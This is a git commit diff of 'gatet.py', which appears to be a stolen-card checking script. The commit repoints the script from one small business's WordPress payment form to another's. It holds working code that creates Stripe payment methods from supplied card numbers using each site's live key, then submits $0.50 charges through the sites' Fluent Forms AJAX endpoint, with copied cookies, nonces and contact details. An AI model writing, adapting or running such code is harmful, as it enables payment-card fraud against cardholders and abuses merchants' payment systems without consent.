e968ba4e27d260c2daea141d2c6f0080832bfd69
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-04-13 09:48:57 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,25 +26,32 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51JsxR6KI6JQjr28A4vnbJu7Ak0bZXPkSlJ8VZHZXxYVvtKsd64mQ9zdpKxs0Ul9JyMj52HpAkVIl3Rz5qlsCW07n00mj43tDyT'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51IVRriDPCt2tZCsX8E0VVtPadB8IgYZicwBLi7NavcohuncTtItPdiuY68MPdvJsaJ0n3KMJJc8WEgr9zFk23Xfk00fX0LtHvl'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': '3088854a-672f-4aa6-9047-3472fff9892ed73497',
-	    '__stripe_sid': '82e7aa1c-d0e9-407d-878e-e0605e9e86c9e75410',
+	    '__stripe_mid': '5820386d-a056-4a87-8b68-c10de8fef2775eac40',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_current_add': 'fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_first_add': 'fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
+	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F',
+	    '__stripe_sid': 'a497d9ce-e488-439d-8a57-0aafbf1d3df4c87ccd',
 	}
 	
 	headers = {
-	    'authority': 'pietrucking.com',
+	    'authority': 'villagemusiccircles.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=3088854a-672f-4aa6-9047-3472fff9892ed73497; __stripe_sid=82e7aa1c-d0e9-407d-878e-e0605e9e86c9e75410',
-	    'origin': 'https://pietrucking.com',
-	    'referer': 'https://pietrucking.com/tractor-trailer-combo-2/',
+	    # 'cookie': '__stripe_mid=5820386d-a056-4a87-8b68-c10de8fef2775eac40; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-04-13%2002%3A17%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fvillagemusiccircles.com%2Fglobal-facilitator-payment-form%2F; __stripe_sid=a497d9ce-e488-439d-8a57-0aafbf1d3df4c87ccd',
+	    'origin': 'https://villagemusiccircles.com',
+	    'referer': 'https://villagemusiccircles.com/global-facilitator-payment-form/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -56,17 +63,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1744490786974',
+	    't': '1744510751220',
 	}
 	
 	data = {
-	    'data': 'item_22__fluent_sf=&__fluent_protection_token_22=dERnHGWC2qLO9AVC2rQ8oJObKunyBaYwRKqO28gZOr4Pdm44Wt6fJg%2FOGYk7Ge0uqckfWeQSY13jZIFyaF4d7%2FTGjKINyoPBwH1TsHzTkNQan9NBjtN1wm7Lb3gdKA%2Fm&__fluent_form_embded_post_id=501&_fluentform_22_fluentformnonce=5ec522edd2&_wp_http_referer=%2Ftractor-trailer-combo-2%2F&datetime=04%2F12%2F2025&name%5Bfirst_name%5D=Rodam&name%5Blast_name%5D=User&input_text=&phone=0817480671&email=rodamuser08%40gmail.com&dropdown=Tractor%20Trailer%20Combo&input_text_1=2020&input_text_2=Red&input_text_4=A&input_text_6=2020&dropdown_2=Travel%20Trailer&input_text_7=B&terms-n-condition_2=on&terms-n-condition_1=on&terms-n-condition=on&payment-coupon=&custom-payment-amount=0.50&payment_method=stripe&hidden=0&__ff_all_applied_coupons=&__ff_all_applied_coupons=&__ff_all_applied_coupons=&terms-n-condition_3=&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=6796&_fluentform_3_fluentformnonce=c3482ab163&_wp_http_referer=%2Fglobal-facilitator-payment-form%2F&names_1%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&datetime=&email_3=rodamuser08%40gmail.com&phone_4=0817480671&country-list=&reason_for_payment_6%5B%5D=Other&input_text=Deposit&custom-payment-amount_1=0.50&payment_option_12=Pay%20by%20credit%20card&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '22',
+	    'form_id': '3',
 	}
 	
 	r2 = requests.post(
-	    'https://pietrucking.com/wp-admin/admin-ajax.php',
+	    'https://villagemusiccircles.com/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
